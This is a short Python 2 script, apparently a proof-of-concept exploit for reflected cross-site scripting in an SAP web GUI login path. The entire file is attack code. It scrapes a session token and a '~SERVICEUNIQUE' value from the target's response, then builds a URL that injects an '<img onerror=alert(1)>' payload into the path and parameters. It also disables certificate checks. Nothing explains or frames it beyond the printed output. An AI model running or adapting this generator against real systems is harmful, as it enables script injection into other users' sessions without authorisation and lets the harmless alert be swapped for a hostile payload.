#!/usr/bin/python
import argparse
import requests
import re
 
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="Example: https://example.com/wgate/scripts/ralp/!")
args = parser.parse_args()
list=[]
i=0
cookie={'s_fid':'3B9C1B379A11790F-00A298287FA44BF5','s_lv':'1524222141316', 's_nr':'1524222141322-New', 's_vnum':'1555758141333%26vn%3D1'}
url=args.url.split('/')
url2='https://'+str(url[2])+'/'+str(url[3])+'/'+str(url[4])+'/'

if args.url:
	r = requests.get(args.url,verify=False,cookies=cookie)
	header = r.headers['Set-Cookie']
	cookie_val = header.split(";")

	for line in r.iter_lines():
        	list.append(line)
        	i=i+1
        	if line.find('~SERVICEUNIQUE') > 0:
                	param = line.replace('"','')
                	v = param.split('=')
                	val0 = v[3].split(' ')
			print '[+]Random Value:',val0[0]

	for line2 in range(len(cookie_val)):
        	if cookie_val[line2].find('~session') == 0:
                	val1 = cookie_val[line2].split('=')
			print '[+]Session Value:',val1[1]
	print '[+] Vulnerable URL:'+url2+val0[0]+'%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3e/?%7ESERVICEUNIQUE='+val0[0]+'%3cimg%20src%3da%20onerror%3dalert(1)%3e&%7Eclientinput=1&%7Elogininput=1&%7Epasswdinput=1&%7Eclient=100&%7Elogin=%3F&%7Epassword=aaaaa&%7EPOV=P&%7EOkCode%3D%2F0=Entrar&~session='+val1[1]


else:
	print '[!] Empty URL, please see help (-h,--help)'




